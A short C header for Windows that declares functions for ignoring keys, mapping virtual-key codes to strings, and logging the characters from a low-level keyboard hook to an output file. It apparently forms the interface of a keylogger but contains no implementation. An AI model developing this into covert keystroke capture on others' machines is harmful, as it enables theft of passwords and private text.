#pragma once

#include <errno.h>
#include <Windows.h>

/*
 * is_ignored - Determines if the provided virtual-key code is ignored.
 * @vk_code: The virtual-key code.
 *
 * Returns whether or not the provided virtual-key is ignored.
 */
BOOL is_ignored(DWORD vk_code);

/*
 * get_virtual_key_value - Gets the respective value of the virtual-key code.
 * @vk_code: The virtual-key code.
 *
 * Returns the respective string if found. If not, returns NULL.
 */
LPCWSTR get_virtual_key_value(DWORD vk_code);

/*
 * log_kbd - Logs the respective unicode characters of the provided kbd hook
 * structure to the out file.
 * @kbd_hook: The kbd hook structure of the keypress.
 *
 * Returns zero if successful. On error, returns a non-zero error code.
 */
errno_t log_kbd(const KBDLLHOOKSTRUCT* kbd_hook);
